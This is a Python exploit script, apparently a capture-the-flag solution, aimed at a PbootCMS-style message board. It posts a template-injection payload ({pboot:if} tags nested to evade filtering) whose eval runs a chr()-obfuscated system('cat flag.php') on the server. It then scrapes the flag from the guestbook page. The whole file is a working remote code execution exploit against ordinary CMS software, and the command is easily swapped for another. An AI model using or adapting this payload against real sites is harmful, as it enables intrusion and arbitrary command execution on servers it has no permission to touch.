import requests
import re


def postExp(url):
    post_data = {
        'contacts': '666',
        'mobile': '1008611',
        'content': '{pbootpbootpboot:if:if:if((eval ( chr (0x73).chr (0x79).chr (0x73).chr (0x74).chr (0x65).chr ('
                   '0x6d).chr (0x28).chr (0x22).chr (0x63).chr (0x61).chr (0x74).chr (0x20).chr (0x66).chr (0x6c).chr '
                   '(0x61).chr (0x67).chr (0x2e).chr (0x70).chr (0x68).chr (0x70).chr (0x22).chr (0x29).chr ('
                   '0x3b))))}!!!{/pbootpbootpboot:if:if:if} '
    }
    response = requests.post(url, data=post_data)
    if response.status_code == 200:
        print("Exp 插入成功")
        return True
    else:
        print("Exp 插入失败，请检查网站状态，response code=" + str(response.status_code))
        return False


def getFlag():
    r = requests.get("http://127.0.0.1/?gbook/")
    flagg = re.findall(r'''flag="(.+?)";''', r.text)
    if (len(flagg)!=0):
        print(flagg[0])
    else:
        print("Flag获取失败")
    


if __name__ == '__main__':
    url = "http://127.0.0.1/?message/"
    if postExp(url):
        getFlag()
